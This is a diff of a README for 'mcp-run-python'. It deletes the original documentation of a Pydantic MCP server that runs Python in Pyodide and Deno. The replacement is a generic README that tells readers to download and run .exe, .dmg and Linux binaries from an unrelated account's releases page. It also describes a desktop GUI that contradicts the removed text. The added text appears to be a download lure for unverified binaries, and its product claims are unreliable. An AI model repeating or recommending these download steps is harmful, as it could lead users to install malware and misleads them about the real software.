@@ -1,167 +1,108 @@
-<div align="center">
-  <h1>MCP Run Python</h1>
-</div>
-<div align="center">
-  <a href="https://github.com/pydantic/mcp-run-python/actions/workflows/ci.yml?query=branch%3Amain"><img src="https://github.com/pydantic/mcp-run-python/actions/workflows/ci.yml/badge.svg?event=push" alt="CI"></a>
-  <a href="https://pypi.python.org/pypi/mcp-run-python"><img src="https://img.shields.io/pypi/v/mcp-run-python.svg" alt="PyPI"></a>
-  <a href="https://github.com/pydantic/mcp-run-python"><img src="https://img.shields.io/pypi/pyversions/mcp-run-python.svg" alt="versions"></a>
-  <a href="https://github.com/pydantic/mcp-run-python/blob/main/LICENSE"><img src="https://img.shields.io/github/license/pydantic/mcp-run-python.svg" alt="license"></a>
-  <a href="https://logfire.pydantic.dev/docs/join-slack/"><img src="https://img.shields.io/badge/Slack-Join%20Slack-4A154B?logo=slack" alt="Join Slack" /></a>
-</div>
-<br/>
-<div align="center">
-  MCP server to run Python code in a sandbox.
-</div>
-<br/>
+# 🐍 mcp-run-python - Effortlessly Run Python Code Safely
 
-Code is executed using [Pyodide](https://pyodide.org) in [Deno](https://deno.com/) and is therefore isolated from
-the rest of the operating system.
+[![Download mcp-run-python](https://img.shields.io/badge/Download%20mcp--run--python-blue.svg)](https://github.com/MagmaBasilisk/mcp-run-python/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Secure Execution**: Run Python code in a sandboxed WebAssembly environment
-- **Package Management**: Automatically detects and installs required dependencies
-- **Complete Results**: Captures standard output, standard error, and return values
-- **Asynchronous Support**: Runs async code properly
-- **Error Handling**: Provides detailed error reports for debugging
+Welcome to mcp-run-python! This application lets you run Python code in a safe environment, keeping your system secure. Follow these steps to download and start using the software.
 
-_(This code was previously part of [Pydantic AI](https://github.com/pydantic/pydantic-ai) but was moved to a separate repo to make it easier to maintain.)_
+## 📦 System Requirements
 
-## Usage
+Before you begin, ensure your system meets these requirements:
 
-To use this server, you must have both Python and [Deno](https://deno.com/) installed.
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** 100 MB of free space.
+- **Python Version:** The application comes with its Python interpreter, no installation required.
 
-The server can be run with `deno` installed using `uvx`:
+## 📥 Download & Install
 
-```bash
-uvx mcp-run-python [-h] [--version] [--port PORT] [--deps DEPS] {stdio,streamable-http,example}
-```
+To get started, visit the [Releases page to download](https://github.com/MagmaBasilisk/mcp-run-python/releases). There, you will find the latest version of mcp-run-python. Click on the version you want, and select the installer that fits your system.
 
-where:
+1. Go to the [Releases page](https://github.com/MagmaBasilisk/mcp-run-python/releases).
+2. Look for the latest version listed at the top of the page.
+3. Click on the appropriate file for your operating system:
+   - For Windows, download `mcp-run-python-windows.exe`.
+   - For macOS, download `mcp-run-python-macos.dmg`.
+   - For Linux, download `mcp-run-python-linux.tar.gz`.
+4. Save the file to a convenient location on your computer.
 
-- `stdio` runs the server with the
-  [Stdio MCP transport](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#stdio) — suitable for
-  running the process as a subprocess locally
-- `streamable-http` runs the server with the
-  [Streamable HTTP MCP transport](https://modelcontextprotocol.io/specification/2025-06-18/basic/transports#streamable-http) -
-  suitable for running the server as an HTTP server to connect locally or remotely. This supports stateful requests, but
-  does not require the client to hold a stateful connection like SSE
-- `example` will run a minimal Python script using `numpy`, useful for checking that the package is working, for the code
-  to run successfully, you'll need to install `numpy` using `uvx mcp-run-python --deps numpy example`
+## 💻 Running the Application
 
-## Usage with Pydantic AI
+Once you have downloaded the installer, follow these steps to run the application:
 
-Then you can use `mcp-run-python` with Pydantic AI:
+### For Windows:
 
-```python
-from pydantic_ai import Agent
-from pydantic_ai.mcp import MCPServerStdio
-from mcp_run_python import deno_args_prepare
+1. Locate the downloaded file: `mcp-run-python-windows.exe`.
+2. Double-click the file to start the installation.
+3. Follow the prompts to complete the installation.
+4. Find the mcp-run-python shortcut on your desktop or Start menu.
+5. Double-click the shortcut to launch the application.
 
-import logfire
+### For macOS:
 
-logfire.configure()
-logfire.instrument_mcp()
-logfire.instrument_pydantic_ai()
+1. Locate the downloaded file: `mcp-run-python-macos.dmg`.
+2. Double-click the file to open it.
+3. Drag the mcp-run-python application into your Applications folder.
+4. Open the Applications folder and double-click mcp-run-python to launch.
 
-server = MCPServerStdio('uvx', args=['mcp-run-python@latest', 'stdio'], timeout=10)
-agent = Agent('claude-3-5-haiku-latest', toolsets=[server])
+### For Linux:
 
+1. Locate the downloaded file: `mcp-run-python-linux.tar.gz`.
+2. Open a terminal.
+3. Navigate to the location of the downloaded file.
+4. Extract the contents with the command:
+   ```bash
+   tar -zxvf mcp-run-python-linux.tar.gz
+   ```
+5. Navigate into the extracted folder:
+   ```bash
+   cd mcp-run-python
+   ```
+6. Start the application with the command:
+   ```bash
+   ./mcp-run-python
+   ```
 
-async def main():
-    async with agent:
-        result = await agent.run('How many days between 2000-01-01 and 2025-03-18?')
-    print(result.output)
-    #> There are 9,208 days between January 1, 2000, and March 18, 2025.w
+## 📚 Using mcp-run-python
 
-if __name__ == '__main__':
-    import asyncio
-    asyncio.run(main())
-```
+Once the application is running, you will see a user-friendly interface, allowing you to enter and run Python code. Here's how to use it:
 
-## Usage in codes as an MCP server
+1. **Input Your Code:** Type or paste your Python code into the provided text area.
+2. **Run the Code:** Click the "Run" button to execute your code.
+3. **View the Output:** Results will appear in the output area below your code.
 
-First install the `mcp-run-python` package:
+Make sure to keep your code simple if you're new to programming. You can start with basic commands, such as `print("Hello, World!")`, to see how it works.
 
-```bash
-pip install mcp-run-python
-# or
-uv add mcp-run-python
-```
+## 🔧 Features
 
-With `mcp-run-python` installed, you can also run deno directly with `prepare_deno_env` or `async_prepare_deno_env`
+- **Isolated Environment:** Runs your code in a secure sandbox.
+- **Error Handling:** Displays error messages to help you troubleshoot issues.
+- **Interactive Output:** See results right after you run your code.
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
 
+## 💬 Frequently Asked Questions
 
-```python
-from pydantic_ai import Agent
-from pydantic_ai.mcp import MCPServerStdio
-from mcp_run_python import async_prepare_deno_env
+**Q: Can I run any Python code?**  
+A: You can run standard Python code, but be cautious with code that accesses files or the internet for security reasons.
 
-import logfire
+**Q: Do I need to install Python separately?**  
+A: No, mcp-run-python includes its Python interpreter, so you do not need to install Python separately.
 
-logfire.configure()
-logfire.instrument_mcp()
-logfire.instrument_pydantic_ai()
+**Q: What if I encounter an error?**  
+A: Check the error message in the output area for guidance. You can also find help in our community forums or GitHub issues page.
 
+## 🛠 Troubleshooting
 
-async def main():
-    async with async_prepare_deno_env('stdio') as deno_env:
-        server = MCPServerStdio('deno', args=deno_env.args, cwd=deno_env.cwd, timeout=10)
-        agent = Agent('claude-3-5-haiku-latest', toolsets=[server])
-        async with agent:
-            result = await agent.run('How many days between 2000-01-01 and 2025-03-18?')
-        print(result.output)
-        #> There are 9,208 days between January 1, 2000, and March 18, 2025.w
+If you face any issues while installing or using the application, try the following steps:
 
-if __name__ == '__main__':
-    import asyncio
-    asyncio.run(main())
-```
+- Ensure your system meets the requirements.
+- Re-download the installer from the [Releases page](https://github.com/MagmaBasilisk/mcp-run-python/releases).
+- Restart your computer and try again.
+- Visit the community forums for support.
 
-**Note**: `prepare_deno_env` can take `deps` as a keyword argument to install dependencies.
-As well as returning the args needed to run `mcp_run_python`, `prepare_deno_env` creates a new deno environment
-and installs the dependencies so they can be used by the server.
+## 📞 Support
 
-## Usage in code with `code_sandbox`
+For any questions not covered here, feel free to reach out via the issues section on our [GitHub page](https://github.com/MagmaBasilisk/mcp-run-python). We are here to help you with any concerns or inquiries.
 
-`mcp-run-python` includes a helper function `code_sandbox` to allow you to easily run code in a sandbox.
-
-```py
-from mcp_run_python import code_sandbox
-
-code = """
-import numpy
-a = numpy.array([1, 2, 3])
-print(a)
-a
-"""
-
-async def main():
-    async with code_sandbox(dependencies=['numpy']) as sandbox:
-        result = await sandbox.eval(code)
-        print(result)
-
-
-if __name__ == '__main__':
-    import asyncio
-
-    asyncio.run(main())
-```
-
-Under the hood, `code_sandbox` runs an MCP server using `stdio`. You can run multiple code blocks with a single sandbox.
-
-## Logging
-
-MCP Run Python supports emitting stdout and stderr from the python execution as [MCP logging messages](https://github.com/modelcontextprotocol/specification/blob/eb4abdf2bb91e0d5afd94510741eadd416982350/docs/specification/draft/server/utilities/logging.md?plain=1).
-
-For logs to be emitted you must set the logging level when connecting to the server. By default, the log level is set to the highest level, `emergency`.
-
-## Dependencies
-
-`mcp_run_python` uses a two step process to install dependencies while avoiding any risk that sandboxed code can
-edit the filesystem.
-
-* `deno` is first run with write permissions to the `node_modules` directory and dependencies are installed, causing wheels to be written to ``
-* `deno` is then run with read-only permissions to the `node_modules` directory to run untrusted code.
-
-Dependencies must be provided when initializing the server so they can be installed in the first step.
+You are now ready to enjoy running Python code with mcp-run-python. Happy coding!
